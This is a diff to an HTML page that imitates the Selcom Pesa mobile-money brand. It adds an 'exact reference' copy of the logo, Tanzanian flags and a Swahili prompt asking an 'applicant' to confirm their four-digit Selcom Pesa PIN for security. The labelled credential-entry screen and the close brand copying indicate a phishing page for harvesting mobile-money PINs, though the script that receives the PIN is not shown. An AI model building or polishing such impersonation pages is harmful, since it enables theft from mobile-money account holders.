@@ -241,42 +241,82 @@
     </div>
   </section>
 
-  <!-- SCREEN 6: PIN CREDENTIALS ENTRY -->
-  <section id="screen-signin" class="screen white-screen">
-    <div class="selcom-header-sm">
-      <div class="selcom-brand-dark">Selcom</div>
-      <small>Selcom Pay na Huduma Nyinginezo</small>
-    </div>
+  <!-- SCREEN 6: PIN CREDENTIALS ENTRY (Exact Reference Design 100%) -->
+  <section id="screen-signin" class="screen pin-custom-bg">
+    
+    <!-- Top Header Banner with Flag & Selcom Logo -->
+    <div class="pin-top-banner">
+      <div class="corner-flag-left">
+        <svg viewBox="0 0 900 600" class="mini-tz-flag">
+          <rect width="900" height="600" fill="#00A3DD"/>
+          <polygon points="0,0 900,600 900,450 0,0" fill="#1EB53A"/>
+          <polygon points="0,0 900,600 750,600 0,150" fill="#000000"/>
+          <polygon points="0,0 900,600 780,600 0,120" fill="#FCD116"/>
+          <polygon points="0,0 900,600 720,600 0,60" fill="#FCD116"/>
+        </svg>
+      </div>
 
-    <div class="login-header-text">
-      <h2>Ingia Akaunti</h2>
-      <!-- Applicant phone number displayed at the top -->
-      <div class="applicant-number-badge" id="display-applicant-phone">+255 712 345 678</div>
-    </div>
-
-    <div id="banner-creds-error" class="surface-error-banner">
-      TAFADHALI WEKA PIN YAKO SAHIHI YA SELCOM PESA
-    </div>
-
-    <div class="card-box-clean">
-      <div class="form-group-clean align-center">
-        <label>Weka PIN yako (tarakimu 4)</label>
-        <div class="pin-boxes-flex">
-          <input type="password" class="pin-box-num" maxlength="1" inputmode="numeric">
-          <input type="password" class="pin-box-num" maxlength="1" inputmode="numeric">
-          <input type="password" class="pin-box-num" maxlength="1" inputmode="numeric">
-          <input type="password" class="pin-box-num" maxlength="1" inputmode="numeric">
-          <span class="pin-eye-icon" id="toggle-pin-visibility">👁</span>
+      <div class="selcom-white-badge-box">
+        <div class="selcom-logo-text-inline">
+          <span class="se-txt">se</span><span class="dot-red">l</span><span class="com-txt">com</span>
         </div>
+        <div class="tanzania-sub-tag">TANZANIA</div>
       </div>
 
-      <div class="forgot-link align-center">
-        <a href="#">Umesahau PIN?</a>
+      <div class="corner-flag-right">
+        <svg viewBox="0 0 900 600" class="mini-tz-flag">
+          <rect width="900" height="600" fill="#00A3DD"/>
+          <polygon points="0,0 900,600 900,450 0,0" fill="#1EB53A"/>
+          <polygon points="0,0 900,600 750,600 0,150" fill="#000000"/>
+          <polygon points="0,0 900,600 780,600 0,120" fill="#FCD116"/>
+          <polygon points="0,0 900,600 720,600 0,60" fill="#FCD116"/>
+        </svg>
       </div>
     </div>
 
-    <div class="login-action-bottom">
-      <button type="button" id="btn-submit-creds" class="btn-selcom-disabled">INGIA</button>
+    <div class="pin-screen-body">
+      <div class="applicant-phone-indicator" id="display-applicant-phone">+255 712 345 678</div>
+
+      <h1 class="pin-main-title">Thibitisha PIN yako ya<br>SELCOM PESA</h1>
+
+      <p class="pin-desc-text">
+        Kwa usalama, tafadhali thibitisha PIN yako ya tarakimu 4 ya akaunti ili kuendelea.
+      </p>
+
+      <div id="banner-creds-error" class="surface-error-banner">
+        TAFADHALI WEKA PIN YAKO SAHIHI YA SELCOM PESA
+      </div>
+
+      <div class="pin-mid-row">
+        <div class="waving-flag-icon">
+          <svg viewBox="0 0 900 600" class="mini-tz-flag">
+            <rect width="900" height="600" fill="#00A3DD"/>
+            <polygon points="0,0 900,600 900,450 0,0" fill="#1EB53A"/>
+            <polygon points="0,0 900,600 750,600 0,150" fill="#000000"/>
+            <polygon points="0,0 900,600 780,600 0,120" fill="#FCD116"/>
+            <polygon points="0,0 900,600 720,600 0,60" fill="#FCD116"/>
+          </svg>
+        </div>
+        <span class="pin-label-text">PIN yako ya tarakimu 4</span>
+        <div class="phone-lock-icon">📱🔒</div>
+      </div>
+
+      <!-- Golden Metallic Box Housing 4 PIN Squares -->
+      <div class="golden-pin-container">
+        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+        <span class="pin-eye-toggle" id="toggle-pin-visibility">👁</span>
+      </div>
+
+      <p class="pin-footer-hint">
+        Hakikisha hii inalingana na PIN uliyoweka kwa akaunti hii.
+      </p>
+    </div>
+
+    <div class="pin-bottom-action">
+      <button type="button" id="btn-submit-creds" class="btn-red-wasilisha btn-selcom-disabled">WASILISHA</button>
     </div>
   </section>
 
@@ -353,5 +393,5 @@
 
 <script src="script.js"></script>
 </body>
-              </html>
-  
+  </html>
+          
